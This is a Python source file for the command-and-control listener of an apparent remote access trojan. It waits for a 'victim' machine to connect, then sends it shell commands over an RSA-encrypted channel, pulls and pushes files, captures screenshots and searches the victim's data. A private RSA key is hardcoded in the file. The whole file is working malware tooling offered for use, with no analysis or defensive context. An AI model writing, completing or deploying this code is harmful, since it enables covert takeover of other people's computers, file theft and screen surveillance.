import socket,os,subprocess,datetime
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP

MAX = 1024

class Listener:
    def __init__(self, IP, PORT):
        self.publickey = '''-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAtTEh94t/0XDujbbVFfCF
dNisP/hkxkCudbnOZKJLCSIukYhssjdYCATAif2GVmP+OTIAromv1imCAa5JOd3G
Kfrc/zGp7/E9V55jk3SP/aS4B10ZLYm+ycsI9kaDqxLoyPn+mPhS0iBLy1TBqJWi
sCw34eanpmFOcyt/4MRTv8MCuvmkB3TyEotQJ2Dt+W7Io1zHb6aMS0NNwkiW4TGV
PKGMlgKwSyYLbaQIflYlDEMI5UzYNEQkb3mNN5UtvvySdK2pu/E/vWT4xDsvHANA
+N6nQfqyeuZ9wIQO0m8Ahym6uT345OTBhOihdLWKqmWblnS2XifSMnibWWu+9yDY
Y0Fy6+snxMSqqlovpJJdEk0FcLV0+u4axTfrrrQosQpSOdfKoZjeYEcSpxI5RroH
LyGJYLWfZsH+7Lh5u7D5j6Vp08vW5ADvHQGWa9Ies6dBpGgMZaLyKZhJnPn1zCQy
vW8kEwdtnzf9VTWqzVezSVS4jDQM3BjNh2id1eDh6nM3l8E/Zg76lTD3LF0XE/s1
neHrWwjEJyweq1upuqNawrmnjCv/nnX9DFy7w2MgcAwbCiLzFsiADs+uCeV8yLrA
07YqTDRAyX7stW4wozq9M4oodCW7oDmMPN4ExFJd5oKvDRu9SRM75bXMqi1QiSmL
7tRomzL4Fm1R0KLPKYbyuWUCAwEAAQ==
-----END PUBLIC KEY-----'''
        self.privatekey = '''-----BEGIN RSA PRIVATE KEY-----
MIIJKAIBAAKCAgEAtUSk1HaWYzFhlhYauflJ50mCMBulIe9EZPH4Qd4hOyqJ8yuI
Ts9okbAA6MVjC5qw0mUjlAY2SB/kgVPoVM23fhh8do/AmOVZvCDiz9glUw5zGaiy
ycOckSnJm+vPAOP7ODdbDlQN6QSpaoUH8hB865WgJljS99OcRaAs+pqv6l8QifQD
SUdHUFQDM0Eerpf8jwvhiy6SAJV5rOnP5A1tHa15GfOl0y3B23DF3/9aCRfVOHRF
bIMjchuxRm/Jb7siDWRudzL8qf0mI2PtuHr/cY+AcAyVXxc2xuMKk+tqYwHFVA4t
5zKBzYLLcaP8xsrOGWe299LokU/07ACrU8MtzvxlHVjtdkPJVTmBT/1yQNo08URf
dE8zUuQnkrO2VCpXSevFz7vzh0ob2ZAt61X2u2FQVJbGQf1orvjyJ4EFZ1Hnaz8x
tYIaHzOon+jm46Evo6Q2OHq58EHOUdC3DzuOsmNzsAlySPyXh+rYSwOZbmSgk/Sm
lRLdilpdwP8axE6RCjosw3fH6X5OrT41DmvCHs22ZMV2YrG4EjifPsnitQNwXjGs
MmAyHQ/ETXP66r2fIBEpi6p0KOeTEAfmhJPkzXRJEBS3hcrnWyABQHne2kEbvJH5
z9FquwMMtNQbG1cCuo0XKIScXNYHwJgKakajslEMB/KNymbafbHPnUDCpp8CAwEA
AQKCAgBQkl77y2xkUd5REqk1ke++HSf/j0Iy18IcZouVZ5F41Zs02dxAP6P44fU9
ggNY9Jz1IByU3sABBiARNkU2cKxHocWtA4+1xnhBDZMTlL1ecjVKKfiygz7ULXFe
W44LFMslPUG9mDIIqdhOLyyNdbO5GaxybxfzLX2wWxazG8/myvO0hiBx0XuK4pT7
ks37CDasNLk/nucp2EcZy2HrOeaPAv0pwmmqeRPKoRFrU/rmwM+3RMNZDN9UCKgf
KXAtuE3WCxao6CJzwsDRiUjwr8dcaE9MPuOkPVLNS7z3a/RBZteZ2aWgtwwIV8Nr
U1t310yN8VJcTMSwVoyE3HVLCZ4Ru/Xt216txWQCcO7bDQtdPb2fkAFvK9ObWi+Y
VcaFhdIu39X7xyd3WZFrjscfeEzQpQlT4RSq7LrGwFFmgwn3VAOTWp8KETbv+zUI
q/x2bRMvMenmHyXXjk4wzzspeF0Cer0LEMFwH+FWXZ4C/2+AD+eT5wcRQnQL1k0T
c4jCr1UQ+oeIBk5tZiaymLkG/xxjeF4hPAUOuz8DbstPtLJYxWydYcwUalp5opqS
t6n5ZK7rYFjuRdwk1osTQTiTM48pYzU9g95EAkeWKAsqiV2dWPcMZrh2EKa4lshh
ozGXp7RVrP9mjF0QA7Hh0RtxWF6HLQj2Su6jSWa0B0yt7xAwQQKCAQEA0HNe7/OO
dtzkktwrHqwUapMvRTFwJYDzGcfT36iOP7533vsyJ1r+nEHM9gx6b4JXErHGhRHU
gtmhWy8S4ltIGkZNZ6Ws6INRcgbGOIxSfZsa1ogTwlG5Bo2TROdoKbqf5gUb2Jl5
S3jf6Mt/tcj+dSWZCFKGDBeoHJB+ZhvkRjI5YL/ja6Kml4mHnJmdxb1NpRwX3Dfx
MPvRB1C3+OlZSrUnC99pn9oHUp/BMXAs3TqHBd4gCWFkPeAozKYyw2IX4pGnHQk6
fTComW1UqUWK+6WBucJTl5a63CbOUJW0yoZpRcoOcL1uwFQiWQoD1WPl52Zwzof3
djUPhjXygtBDXwKCAQEA3p3t8SNFAF3Gx1WAp0PkjIlzqdkQq5zBCDGlx3dYedX3
SgO8n3yJAQPW8wiC9dcK3j4W4dX/d3ERjW65w+HQG4fLhK5d5zobE6D/vIzmtlJq
Sl5X5Icbul2HTiHtyoo9qvZr9f9ub6zw93qihgXEei0ozNmQZ19xg6DAOwFytorw
FeeNJZrcb8U5UlMlzu/bWbj8xGtiGWLINHfiFZzSDNjXc3kug1al7quao7SKoLCq
pOuHVvgJo3kop+LXhfncw9ehIYOKmnnyOqM1DdiFKK1yQDYSgBlji23ZBOEHyOPq
llyzQnbK9gsrPLOCdvZp3zCnYubbfq249N3UT8mkwQKCAQEAvT/BdcB+G1Q5AUx6
qYI5lvjB9eQImUQVcdaGeYyieSUH153fzvNCLcNfvhNeJVcEjqhwP+gMNDA52ntG
fdO6BoDFTdCQxxhSHWAhHr3nNrpXB2bL6aQgg96NUgV2AEy7Vy5UNbZA9VBsmQII
lJZCz0CvS2sA4IGp0yUsXK/98+0tQrV0WAh3jyUBxh+BqkFP+RMkZn8zrvEwuZ+D
J61TsAv/wzu2vbZI5666y5O4Z7H3XFBqbZnKVJLq98H8XH72iHEMc8QpIffHWmR0
dKn6oLWGrYvMMNhcFfv1XBxO44Bcm0vzCFAz+NFpzcTV7iqgVBIhYKD4/oz15zeb
UUCbqQKCAQAxfBmwSI7GDhJprO/0PntHYiZ70uyJuUaPc7nOJRFdw9o8cag0K5Ko
zxmw3GuAClU4IcUkXlVzT4b/UWWpzUBdXko3LCtjgt8R9e/jEc8XKCrIbUBMZFwd
iTzSeWhKZYBfyHcnL6h02pSV7oTCFfYe0nsHTjVzRRwOjmUsuJ2vRiMoO1h8y3fE
wKqFSkZVQawYva4yW0xrKDIot51iAIIQqQL7gCx+tXwdGbg+O5u1LJBCKLjk9C3w
ULZg22PdPDV+syf2My9UN1dJAY6BjWfMKwIClAJ4xywBimF7XCpG1aMH2YNfetiS
6NirnZuaphvSqRYMPhT8i9FZXRYcxk4BAoIBAFbR3iYvpt+wBx2bC3hfJDM3KUgB
okFR2dc9dhjqDQ3YmDtuMf8X1OFz1Xbaog7ule9HZq+rtu1RvVjyN10PREecGKeB
w00YhD1MuUG/O0M/PWESiLjLmzUaKOrWvh7+MwqSewvfJA466rNGcoPg7HcaElba
lgKFNB0WAhw9dYCLHW1wtjejOc+IaeCxdMf77NX7hO7YsJS1FIyohB1EAcXZTz7H
1jsEd/JGRShFRefpiZ4h15KSCX4j1f7MIXpDCkCiQYkOsVgDcV6tungzY/sT4lJg
5BWehRyotqkEfoqiAU7Qa+MV3DMo/M/wN1IThrVCioNW/mJeyN8FObU8lv4=
-----END RSA PRIVATE KEY-----'''
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((IP,PORT))
        self.listener.listen(0)
        print("[+] Waiting for incoming connection on PORT: " + str(PORT))
        try:
            self.connection, address = self.listener.accept()
        except KeyboardInterrupt:
            exit("\nEXIT")
        print("[+] New connection from " + str(address))
        self.victim = self.r_recv()

    def encrypt(self, msg):
        public_key = RSA.importKey(self.publickey)
        encryptor = PKCS1_OAEP.new(public_key)
        encryptedData = encryptor.encrypt(msg)
        return encryptedData

    def decrypt(self, cipher):
        private_key = RSA.importKey(self.privatekey)
        decryptor = PKCS1_OAEP.new(private_key)
        dec = decryptor.decrypt(cipher)
        return dec.decode()


    def r_send(self, msg):
        msg = msg.encode()
        encrypted = "".encode()
        if(len(msg)>470):
            for i in range(0,len(msg),470):
                chunk = msg[0+i:470+i]
                encrypted += self.encrypt(chunk)
        else:
            encrypted = self.encrypt(msg)
        encrypted += "done".encode()
        self.connection.send(encrypted)


    def r_recv(self):
        data = "".encode()
        while not data.endswith("done".encode()):
            data += self.connection.recv(MAX)
        data = data[:-4]
        decrypted = ""
        if len(data)>512:
            for i in range(0,len(data),512):
                chunk = data[i+0:i+512]
                decrypted += self.decrypt(chunk)
        else:
            decrypted = self.decrypt(data)
        return decrypted



    def download(self, filename):
        f = open(filename,"wb")
        while(True):
            packet = self.connection.recv(MAX)
            if "[-] File not found".encode() in packet:
                print("[-] File not found")
                os.remove(filename)
                break
            elif packet.endswith("done".encode()):
                f.write(packet[:-4])
                f.close()
                print("[+] Download completed")
                break
            f.write(packet)

    def upload(self,filename):
        if os.path.exists(filename):
            f = open(filename,'rb')
            packet = f.read(MAX)
            while(len(packet)>0):
                self.connection.send(packet)
                packet = f.read(MAX)
            self.connection.send("done".encode())
        else:
            self.connection.send("[-] File not found".encode())
            print("[-] File not found")


    def run(self):
        while(True):
            try:
                cmd = str(input("[" + self.victim + "]>> "))
                if(len(cmd.strip())<1):
                    self.run()
                self.r_send(cmd)
                cmd = cmd.split(' ')
                if cmd[0] == "download":
                    self.download(cmd[1])
                elif cmd[0] == "upload":
                    self.upload(cmd[1])
                elif cmd[0] == "clear":
                    subprocess.call('clear',shell=True)
                elif cmd[0] == "capture":
                    if not os.path.exists("screenshots"):
                        os.mkdir("screenshots")
                    os.chdir("screenshots")
                    filename = str(datetime.datetime.now())
                    self.download(filename)
                    os.chdir("..")
                elif cmd[0] == "search" and len(cmd)>1:
                    res = self.r_recv()
                    print(res)
                else:
                    result = self.r_recv()
                    print(result)
                    

            except KeyboardInterrupt:
                self.r_send("terminate")
                self.connection.close()
                exit("\nEXIT")

listener = Listener("192.168.1.99",2000)
listener.run()